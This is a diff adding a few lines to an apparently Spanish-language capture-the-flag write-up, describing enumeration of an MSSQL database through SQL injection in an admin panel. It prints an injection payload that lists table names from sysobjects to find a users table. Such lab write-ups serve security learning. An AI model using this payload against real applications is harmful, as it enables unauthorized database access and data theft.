@@ -170,3 +170,11 @@ Pues asi lo primero que me llama la atención es que podemos añadir cosas, así
 Y vemos que es vulnerable y nos muestra el nombre de la base de datos:
 
 ![](/assets/images/writeup-context/admin-sqli-2.PNG)
+
+Por lo que si seguimos enumerando la base de datos nos encontramos la `tabla users`:
+
+```
+'+(select name from webapp..sysobjects where xtype = 'U' order by name offset 1 rows fetch next 1 rows only)+'
+```
+
+![](/assets/images/writeup-context/admin-sqli-3.PNG)
